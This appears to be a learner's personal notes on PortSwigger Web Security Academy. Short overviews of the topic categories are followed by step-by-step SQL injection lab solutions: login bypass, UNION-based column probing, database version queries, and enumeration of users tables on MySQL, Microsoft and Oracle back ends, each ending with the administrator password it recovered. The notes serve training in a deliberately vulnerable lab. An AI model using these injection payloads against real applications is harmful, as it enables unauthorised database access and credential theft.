
Server-side topics

For complete beginners, we recommend starting with our server-side topics. These vulnerabilities are typically easier to learn because you only need to understand what's happening on the server. Our materials and labs will help you develop some of the core knowledge and skills that you will rely on time after time.


![[Pasted image 20221204102318.png]]


Client-side topics

Client-side vulnerabilities introduce an additional layer of complexity, which can make them slightly more challenging. These materials and labs will help you build on the server-side skills you've already learned and teach you how to identify and exploit some gnarly client-side vectors as well.


![[Pasted image 20221204102412.png]]


Advanced topics

These topics aren't necessarily more difficult to master but they generally require deeper understanding and a wider breadth of knowledge. We recommend getting to grips with the basics before tackling these labs, some of which are based on pioneering techniques discovered by our world-class research team.


![[Pasted image 20221204102529.png]]


```
Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

https://0a2c00d504db930ac0dd522f00c200d4.web-security-academy.net/filter?category=Gifts%27+OR+1=1--

'+OR+1=1--

SQL injection vulnerability allowing login bypass

intercepting with bursuite professional (to use POST method, direct just using GET method)
POST /login HTTP/1.1
..
..
csrf=zZVXJyXD1MAoc7NmPhTbiwV6oTHnPLU9&username=administrator'--&password=test

administrator'--

SQL injection UNION attack, determining the number of columns returned by the query

https://0a940099032a32b1c0accd9700b600bf.web-security-academy.net/filter?category=Tech+gifts%27+UNION+SELECT+NULL,NULL--

'+UNION+SELECT+NULL,NULL,NULL--

SQL injection UNION attack, finding a column containing text

https://0a0700da0310c245c1224c3f0078007d.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+NULL,%27Rl5fpK%27,NULL--

'+UNION+SELECT+NULL,'Rl5fpK',NULL--

SQL injection UNION attack, retrieving data from other tables

https://0add00cf0390824ac040b034004b0033.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users--

'+UNION+SELECT+username,password+FROM+users--

administrator
7odliemd3bi9jt1gtfk4

login

SQL injection attack, querying the database type and version on Oracle

first:
https://0a64002103c8b3d9c03f01bd00bd0097.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+%27abc%27,NULL+FROM+dual--

'+UNION+SELECT+'abc',NULL+FROM+dual--

second:
https://0a64002103c8b3d9c03f01bd00bd0097.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+banner,NULL+FROM+v$version--

'+UNION+SELECT+banner,NULL+FROM+v$version--

SQL injection attack, querying the database type and version on MySQL and Microsoft

intercept with burp professional (and send to repeater Ctrl+R)

GET /filter?category=Pets'+UNION+SELECT+@@version,NULL# HTTP/1.1

'+UNION+SELECT+@@version,NULL#

SQL injection attack, listing the database contents on non-Oracle databases

intercept with burp

first:
GET /filter?category=Pets'+UNION+SELECT+'abc','def'-- HTTP/1.1
second:
GET /filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/1.1
found table users: users_ufalec
third:
GET /filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_ufalec'-- HTTP/1.1
found columns: username_blphyc,  password_xblxbo
last:
GET /filter?category=Pets'+UNION+SELECT+username_blphyc,password_xblxbo+FROM+users_ufalec-- HTTP/1.1
found user and pass: <th>administrator</th>  <td>th8eujv09icbe1e86yfe</td>
login

SQL injection attack, listing the database contents on Oracle

intercept with burp

first:
GET /filter?category=Pets'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/1.1
second:
GET /filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1
found table name from users: USERS_HIZXQV
third:
GET /filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_HIZXQV'-- HTTP/1.1
found columns: USERNAME_RUMPAP, PASSWORD_BIQMIR
last:
GET /filter?category=Pets'+UNION+SELECT+USERNAME_RUMPAP,PASSWORD_BIQMIR+FROM+USERS_HIZXQV-- HTTP/1.1
found user and pass:   <th>administrator</th><td>qudkinw7ogtxuwzxam8o</td>
login

some characters for me: alt + 126 : ~ , alt +96: `

SQL injection UNION attack, retrieving multiple values in a single column

first:
GET /filter?category=Pets'+UNION+SELECT+NULL,'abc'-- HTTP/1.1
second:
GET /filter?category=Pets'+UNION+SELECT+NULL,username+FROM+users-- HTTP/1.1
last:
GET /filter?category=Pets'+UNION+SELECT+NULL,username||':'||password+FROM+users-- HTTP/1.1
found: administrator:usx6y3m2l5zw3n274zgv
login



```







